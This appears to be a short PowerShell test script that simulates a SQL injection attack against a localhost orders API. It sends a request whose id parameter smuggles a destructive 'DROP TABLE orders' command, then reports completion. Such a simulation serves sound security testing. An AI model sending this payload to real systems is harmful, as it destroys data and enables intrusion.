# Simulate SQL Injection Attack
Invoke-WebRequest -Uri "http://localhost/api/orders?id=1; DROP TABLE orders;" -Method GET
Write-Host "SQL Injection simulation completed. Check logs for potential vulnerabilities."